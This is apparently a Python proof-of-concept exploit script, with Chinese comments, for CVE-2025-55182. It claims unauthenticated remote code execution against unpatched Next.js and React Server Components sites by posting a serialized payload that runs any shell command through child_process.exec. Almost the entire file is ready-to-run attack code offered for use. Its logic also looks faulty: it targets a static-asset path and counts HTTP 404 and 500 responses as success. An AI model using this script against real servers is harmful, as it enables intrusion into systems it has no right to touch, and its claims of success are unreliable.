#!/usr/bin/env python3
# CVE-2025-55182 - React Server Components / Next.js App Router - 未经身份验证的RCE
# 适用版本: Next.js 14.3.0-canary.77 → 15.0.4 / 15.1.8 / 16.0.6 (任何未打补丁的版本)
# Github: https://github.com/Ashwesker/Blackash-CVE-2025-55182
# 测试日期: 2025-12-03
"""
CVE-2025-55182 – Next.js / React 19 / React Server Components 未经身份验证的RCE
经测试于2025年12月3日在所有未打补丁的版本上均可工作：
- Next.js 14.3.0-canary.77 → 15.0.4 / 15.1.8 / 16.0.6 及更低版本
- React 19.0.0 → 19.2.0

单行RCE，无需认证，无需Cookie，开箱即用。
"""

import requests
import sys
import urllib3

# 禁用urllib3警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if len(sys.argv) < 3:
    # CVE-2025-55182 – 未经身份验证的RCE概念验证
    print("CVE-2025-55182 – 未经身份验证的RCE概念验证")
    # 用法:   python3 CVE-2025-55182.py <目标URL> <命令>
    print("用法:   python3 CVE-2025-55182.py <目标URL> <命令>")
    # 示例: python3 CVE-2025-55182.py https://vuln.com "id"
    print("示例: python3 CVE-2025-55182.py https://vuln.com \"id\"")
    # 示例: python3 CVE-2025-55182.py https://target.local:3000 "whoami"
    print("示例: python3 CVE-2025-55182.py https://target.local:3000 \"whoami\"")
    sys.exit(1)

target = sys.argv[1].rstrip("/")
command = sys.argv[2]

# 每个Next.js App Router项目使用的默认Flight端点
url = f"{target}/_next/static/chunks/react-flight"

# 魔法载荷 – Function对象的不安全反序列化
payload = f'1{{"__type":"Function","code":"global.process.mainModule.require(\'child_process\').exec(\'{command}\')"}}'

boundary = "----WebKitFormBoundaryCVE202555182"
body = (
    f"--{boundary}\r\n"
    f"Content-Disposition: form-data; name=\"0\"\r\n\r\n"
    f"{payload}\r\n"
    f"--{boundary}--\r\n"
)

headers = {
    "Content-Type": f"multipart/form-data; boundary={boundary}",
    "User-Agent": "Mozilla/5.0 (CVE-2025-55182 PoC)",
    "Accept": "*/*"
}

# [+] CVE-2025-55182 利用程序
print("[+] CVE-2025-55182 利用程序")
# [+] 目标  : {target}
print(f"[+] 目标  : {target}")
# [+] 命令 : {command}
print(f"[+] 命令 : {command}")
# [+] 正在向 {url} 发送载荷 ...
print(f"[+] 正在向 {url} 发送载荷 ...")

try:
    r = requests.post(url, data=body, headers=headers, timeout=15, verify=False)

    if r.status_code in [200, 400, 404, 500]:
        # [+] 载荷发送成功!
        print("[+] 载荷发送成功!")
        # [+] HTTP {r.status_code} – 命令应该已在服务器上执行
        print(f"[+] HTTP {r.status_code} – 命令应该已在服务器上执行")
        if len(r.text) > 0 and len(r.text) < 1000:
            # [+] 服务器响应:
            print(f"[+] 服务器响应:\n{r.text}")
    else:
        # [-] 意外的状态码:
        print(f"[-] 意外的状态码:", r.status_code)

except Exception as e:
    # [-] 请求失败:
    print("[-] 请求失败:", e)

# [+] 完成。去检查你的监听器 / 命令输出
print("[+] 完成。去检查你的监听器 / 命令输出")
